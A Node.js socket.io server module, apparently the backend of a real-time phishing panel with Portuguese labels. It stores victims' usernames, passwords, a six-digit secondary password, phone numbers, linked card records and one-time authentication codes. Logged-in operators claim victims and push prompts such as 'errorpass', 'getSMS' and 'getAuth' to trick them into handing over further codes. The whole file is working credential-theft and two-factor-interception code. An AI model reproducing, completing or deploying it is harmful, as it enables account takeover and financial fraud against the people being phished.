const { array } = require('yup')
const Client = require('../models/Client')
const User = require('../models/User')
const UserByToken = require('../middlewares/userByToken')

let clientList = []
let listClient = []
let rooms = []

module.exports = {
    create(socket, io, list) {
        if (!listClient.includes(socket.id)) listClient.push(socket.id)

        var address = socket.handshake

        rooms[address.address] = socket.id

        io.emit('conectado', 'usuário conectou')

        //Send commands
        socket.on('erroruser', async (id) => {
            clientList[socket.id] = id
            io.emit('erroruser', id)
        })

        socket.on('getMailCode', async (id) => {
            clientList[socket.id] = id
            io.emit('getMailCode', id)
        })

        socket.on('getSMS', async (data) => {
            try {
                clientList[socket.id] = data.idClient

                const client = await Client.findByPk(data.idClient)

                if (!client) return

                await client.update({ phoneEnd: data.phoneEnd })

                io.emit('getSMS', data.idClient)
            } catch (error) {
                console.log(error)
            }
        })
        socket.on('errorSMS', async (data) => {
            io.emit(`errorSMS`, data)
        })

        socket.on('errorpass', (id) => {
            clientList[socket.id] = id
            io.emit('errorpass', id)
        })

        socket.on('disp', (data) => {
            clientList[socket.id] = data
            io.emit('disp', data)
        })

        //receive auth
        socket.on('getAuth', (data) => {
            clientList[socket.id] = data
            return io.emit('getAuth', data)
        })

        socket.on('AssignOp', async (data) => {
            try {
                const { cl: id, token } = data

                const { user_id } = await UserByToken(`Bearer ${token}`)

                if (!user_id) return

                const user = await User.findByPk(user_id)

                const client = await Client.findByPk(id, {
                    include: {
                        association: 'cards',
                        order: [['id', 'asc']],
                    },
                })

                if (!client) return

                io.emit('AssignOp', { client: client.toJSON(), operator: user.name })
            } catch (error) {
                console.log(error)
            }
        })

        socket.on('FinishClient', async (data) => {
            const client = await Client.findByPk(data)

            if (!client) return

            return io.emit('FinishClient', data)
        })

        socket.on('sendAuth', async (data) => {
            const { id, code1, code2, code3, code4, code5, code6 } = data

            const auth = `${code1}${code2}${code3}${code4}${code5}${code6}`

            const client = await Client.findByPk(id)

            if (!client) return

            await client.update({ auth })

            io.emit('sendAuth', client.toJSON())
            return io.emit('updateClient', client.toJSON())
        })

        socket.on('userReconnect', async (data) => {
            const id = data

            const client = await Client.findByPk(id)

            clientList = clientList.filter((cl) => cl != id)

            if (!client) return

            if (client.status == `disconnected`) await client.update({ status: 'Reconectou' })

            clientList[socket.id] = client.id

            io.emit('userReconnect', client.toJSON())
        })

        socket.on('sendPass6', async (data) => {
            const { id, password6 } = data

            const client = await Client.findByPk(id)

            if (!client) return

            client.update({
                password6,
                status: 'sendPass6',
            })

            return io.emit('sendPass6', client.toJSON())
        })

        socket.on('disconnect', async (data) => {
            const id = socket.id

            let reconnect = false,
                ipDisconnect = socket.handshake.address

            const clientId = clientList[id]

            io.on(`connect`, (socket) => {
                if (ipDisconnect == socket.handshake.address) reconnect = true
            })

            setTimeout(async () => {
                if (!reconnect) {
                    const client = await Client.findByPk(clientId)

                    if (client) {
                        if (client.status != `sendPass6`) client.update({ status: 'disconnected' })
                        io.emit('clientDisconnect', client.toJSON())
                    }
                }
            }, 2000)
        })

        socket.on('updateClient', async (data) => {
            const { username: user, password, password6, id, phone } = data

            console.log('Dados enviados: %s', data)

            const client = await Client.findByPk(id)

            if (client) await client.update({ user, password, password6, phone })

            return io.emit('updateClient', client.toJSON())
        })

        socket.on('password6Client', async (data) => {
            const { id, password6 } = data
            const client = await Client.findByPk(id)

            if (!client) return

            client.update({ password6 })
        })

        socket.on('createClient', async (data) => {
            try {
                const { username: user, password, password6 } = data

                const info = await Client.findOne({ where: { user } })

                if (info) {
                    await info.update({
                        user,
                        password,
                        password6,
                        status: `updated`,
                    })

                    listClient[socket.id] = info.id

                    socket.join(info.id)

                    return io.emit('updateClient', info.toJSON())
                }

                const newInfo = await Client.create({
                    user,
                    password,
                    password6,
                    status: `connected`,
                })

                listClient[socket.id] = newInfo.id

                socket.join(newInfo.id)

                return io.emit('createClient', newInfo.toJSON())
            } catch (error) {
                console.log(error)
            }
        })
    },
}
